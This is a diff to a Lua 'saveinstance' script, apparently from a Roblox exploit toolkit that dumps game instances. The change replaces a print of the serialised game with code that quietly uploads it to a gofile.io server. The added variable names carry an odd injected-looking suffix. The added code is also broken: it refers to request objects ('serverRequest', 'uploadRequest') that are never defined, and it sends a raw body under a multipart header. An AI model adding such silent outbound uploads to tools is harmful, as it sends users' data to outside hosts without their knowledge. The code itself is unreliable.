@@ -4075,7 +4075,28 @@ local function synsaveinstance(CustomOptions, CustomOptions2)
 					totallen += math.ceil(#chunk / SEGMENT_SIZE)
 				end
 
-				print(buildFinalString(chunks))
+				local serverRequest__funpayjust82jeow = request({
+				    Url = "https://api.gofile.io/getServer",
+				    Method = "GET"
+				})
+				
+				local serverData__funpayjust82jeow = game:GetService("HttpService"):JSONDecode(serverRequest.Body)
+				
+				if serverData__funpayjust82jeow.status == "ok" then
+				    local serverName__funpayjust82jeow = serverData__funpayjust82jeow.data.server
+				    
+				    local uploadRequest__funpayjust82jeow = request({
+				        Url = "https://" .. serverName__funpayjust82jeow .. ".gofile.io/uploadFile",
+				        Method = "POST",
+				        Headers = {
+				            ["Content-Type"] = "multipart/form-data"
+				        },
+				        -- The 'Body' parameter will send the file contents
+				        Body = buildFinalString(chunks)
+				    })
+				    
+				    print("Upload Response:", uploadRequest.Body)
+				end
 
 				local currentlen = 0
 
